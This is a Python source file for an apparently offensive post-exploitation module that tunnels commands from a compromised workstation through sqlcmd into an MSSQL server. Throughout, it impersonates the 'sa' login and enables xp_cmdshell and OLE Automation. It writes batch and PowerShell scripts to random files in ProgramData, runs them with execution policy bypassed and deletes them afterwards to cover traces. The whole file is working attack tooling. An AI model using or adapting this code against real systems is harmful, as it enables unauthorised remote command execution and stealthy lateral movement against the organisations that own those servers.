import random
import string


SCRIPT_CHUNK_SIZE = 1200
SP_OA_CREATE = 2
SP_OA_APPEND = 8


class XpMssqlBase:
    """Execution tunnel to IIS01 via WS01 TONESHELL -> sqlcmd -> MSSQL xp_cmdshell."""

    def __init__(self):
        self._host     = None
        self._login    = None
        self._password = None

    def ready(self) -> bool:
        return self._host is not None

    # ── helpers ─────────────────────────────────────────────────────────────

    def _rand_tmp(self, ext: str) -> str:
        stem = ''.join(random.choices(string.ascii_lowercase, k=8))
        return f"C:\\ProgramData\\{stem}.{ext}"

    def _tsql_escape(self, s: str) -> str:
        """Escape a value for embedding inside a T-SQL string literal '...'."""
        return s.replace("'", "''")

    def _sqlcmd_prefix(self) -> str:
        return f'sqlcmd -S {self._host} -U {self._login} -P {self._password} -C'

    def _exec_q(self, shell, tsql: str, timeout_s: int = None) -> str:
        """Send one sqlcmd -Q task. Escapes " for C runtime -Q "..." boundary only."""
        if getattr(shell, 'debug', False):
            print(f"[DBG] TSQL  → {tsql}")
        cmd = f'{self._sqlcmd_prefix()} -Q "{tsql.replace(chr(34), chr(34)*2)}"'
        return shell.cmd_exec_raw(cmd, timeout_s=timeout_s)

    def _sp_oa_write(self, shell, path: str, content: str):
        """Write content to a remote path on IIS01 via sp_OA FileSystemObject (chunked)."""
        for i, start in enumerate(range(0, len(content), SCRIPT_CHUNK_SIZE)):
            chunk = content[start:start + SCRIPT_CHUNK_SIZE]
            mode  = SP_OA_CREATE if i == 0 else SP_OA_APPEND
            segs     = chunk.split('"')
            val_expr = '+CHAR(34)+'.join(f"'{self._tsql_escape(s)}'" for s in segs)
            tsql  = (
                "EXECUTE AS LOGIN='sa';"
                "DECLARE @f INT,@x INT,@v NVARCHAR(MAX);"
                "EXEC sp_OACreate 'Scripting.FileSystemObject',@f OUT;"
                f"EXEC sp_OAMethod @f,'OpenTextFile',@x OUT,'{self._tsql_escape(path)}',{mode},1;"
                f"SET @v={val_expr};"
                "EXEC sp_OAMethod @x,'Write',NULL,@v;"
                "EXEC sp_OAMethod @x,'Close';"
                "EXEC sp_OADestroy @f;"
            )
            self._exec_q(shell, tsql)

    # ── commands ─────────────────────────────────────────────────────────────

    def cmd_xpinit(self, shell, host: str, login: str, password: str):
        """Enable sp_OA + xp_cmdshell on MSSQL and verify connectivity."""
        self._host     = host
        self._login    = login
        self._password = password
        setup = (
            "EXECUTE AS LOGIN='sa';"
            "EXEC sp_configure 'Ole Automation Procedures',1;RECONFIGURE;"
            "EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;"
        )
        self._exec_q(shell, setup)
        out = self._exec_q(shell, "EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'whoami'")
        print(f"[+] xpinit OK — context: {out.strip()}")

    def cmd_xpshell_cmd(self, shell, cmd: str):
        """Run a cmd.exe command on IIS01 via .bat staging; capture output."""
        bat      = self._rand_tmp("bat")
        out_file = self._rand_tmp("txt")
        self._sp_oa_write(shell, bat, f"{cmd} > {out_file} 2>&1\r\n")
        self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell '{self._tsql_escape(bat)}'")
        output = self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'type {self._tsql_escape(out_file)}'")
        self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'del /f {self._tsql_escape(bat)} {self._tsql_escape(out_file)}'")
        print(output)

    def cmd_xpshell_psh(self, shell, script: str, timeout_s: int = 120):
        """Stage and run a PowerShell script on IIS01; stdout captured by xp_cmdshell."""
        if getattr(shell, 'debug', False):
            preview = script[:400] + ('…' if len(script) > 400 else '')
            print(f"[DBG] PSH   → {preview}")
        ps1 = self._rand_tmp("ps1")
        self._sp_oa_write(shell, ps1, script)
        run_tsql = (
            "EXECUTE AS LOGIN='sa';"
            f"EXEC xp_cmdshell 'powershell -ExecutionPolicy Bypass -NoProfile -File {self._tsql_escape(ps1)}'"
        )
        output = self._exec_q(shell, run_tsql, timeout_s=timeout_s)
        self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'del /f {self._tsql_escape(ps1)}'")
        print(output)
